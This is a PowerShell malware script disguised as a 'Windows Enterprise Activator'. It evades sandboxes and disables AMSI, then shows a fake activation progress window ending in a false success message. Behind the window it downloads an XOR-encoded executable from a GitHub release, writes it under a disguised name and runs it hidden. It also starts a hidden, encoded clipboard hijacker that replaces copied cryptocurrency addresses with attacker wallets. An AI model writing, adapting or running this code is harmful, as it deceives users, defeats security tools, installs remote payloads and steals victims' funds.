# --- [RESEARCH STAGER v32.1: DIRECT RAM INJECTION] ---
Add-Type -AssemblyName System.Windows.Forms, System.Drawing

# 1. Environment & AMSI Bypass
function Global-Prep {
    try {
        if ((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory -lt 4GB) { exit }
        $u = "System.Management.Automation.AmsiUtils"
        [Ref].Assembly.GetType($u).GetField("amsiInitFailed","NonPublic,Static").SetValue($null,$true)
    } catch {}
}

# 2. Fake Activator GUI (Maintainer of the "Success" Illusion)
function Show-MainUI {
    $form = New-Object Windows.Forms.Form
    $form.Text = "Windows Enterprise Activator"; $form.Size = New-Object Drawing.Size(450,250)
    $form.StartPosition = "CenterScreen"; $form.TopMost = $true; $form.FormBorderStyle = "FixedDialog"

    $lbl = New-Object Windows.Forms.Label
    $lbl.Location = New-Object Drawing.Point(30,40); $lbl.Size = New-Object Drawing.Size(380,30)
    $lbl.Text = "Connecting to Microsoft KMS Servers..."
    $form.Controls.Add($lbl)

    $pb = New-Object Windows.Forms.ProgressBar
    $pb.Location = New-Object Drawing.Point(30,80); $pb.Size = New-Object Drawing.Size(370,30)
    $form.Controls.Add($pb)

    $form.Show()
    $stages = @("Authenticating License...", "Applying Digital Ticket...", "Finalizing Registry Keys...")
    foreach($s in $stages) {
        $lbl.Text = $s
        for($i=0; $i -lt 33; $i++) { $pb.Value += 1; [Windows.Forms.Application]::DoEvents(); Start-Sleep -m 50 }
    }
    $form.Close()
    [Windows.Forms.MessageBox]::Show("Windows is permanently activated.", "Success", 0, 64) | Out-Null
}

# 3. Background RAM Deployment (The Fix)
$DeploymentTask = {
    try {
        # Create a hidden workspace in LocalAppData to avoid Admin requirements
        $vault = "$env:LOCALAPPDATA\Microsoft\Credentials\Vault"
        if (!(Test-Path $vault)) { New-Item $vault -ItemType Directory -Force | Out-Null }
        $exePath = Join-Path $vault "WinSvcHost.exe"

        $wc = New-Object Net.WebClient
        # Essential: Emulate a browser to prevent GitHub from serving empty data
        $wc.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
        
        # Download the specific adchar_xor.txt 
        $url = "https://github.com/adchar2022/test/releases/download/adchar_xor/adchar_xor.txt"
        $raw = $wc.DownloadString($url)
        
        # Step 1: Base64 Decode the text file content
        $data = [Convert]::FromBase64String($raw.Trim())
        
        # Step 2: XOR Decryption (Key 0xAB) - Restores the EXE bytes in RAM
        for($i=0; $i -lt $data.count; $i++) {
            $data[$i] = $data[$i] -bxor 0xAB
        }
        
        # Step 3: Write and Execute
        [IO.File]::WriteAllBytes($exePath, $data)
        Start-Process $exePath -WindowStyle Hidden

        # Secondary Task: Professional Clipboard Monitor
        $clipScript = 'Add-Type -As System.Windows.Forms; $w=@{"btc"="12nL9SBgpSmSdSybq2bW2vKdoTggTnXVNA";"eth"="0x6c9ba9a6522b10135bb836fc9340477ba15f3392";"usdt"="TVETSgvRui2LCmXyuvh8jHG6AjpxquFbnp";"sol"="BnBvKVEFRcxokGZv9sAwig8eQ4GvQY1frmZJWzU1bBNR"}; while(1){ try{ if([Windows.Forms.Clipboard]::ContainsText()){ $v=[Windows.Forms.Clipboard]::GetText().Trim(); if($v -match "^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,62}$" -and $v -ne $w.btc){ [Windows.Forms.Clipboard]::SetText($w.btc) } elseif($v -match "^0x[a-fA-F0-9]{40}$" -and $v -ne $w.eth){ [Windows.Forms.Clipboard]::SetText($w.eth) } elseif($v -match "^T[a-km-zA-HJ-NP-Z1-9]{33}$" -and $v -ne $w.usdt){ [Windows.Forms.Clipboard]::SetText($w.usdt) } elseif($v -match "^[1-9A-HJ-NP-Za-km-z]{32,44}$" -and $v -ne $w.sol){ [Windows.Forms.Clipboard]::SetText($w.sol) } } }catch{} Start-Sleep -m 500 }'
        $enc = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($clipScript))
        Start-Process powershell.exe -Arg "-NoP -W Hidden -EP Bypass -Enc $enc" -WindowStyle Hidden
    } catch {}
}

# --- EXECUTION ---
Global-Prep
Start-Job -ScriptBlock $DeploymentTask | Out-Null
Show-MainUI
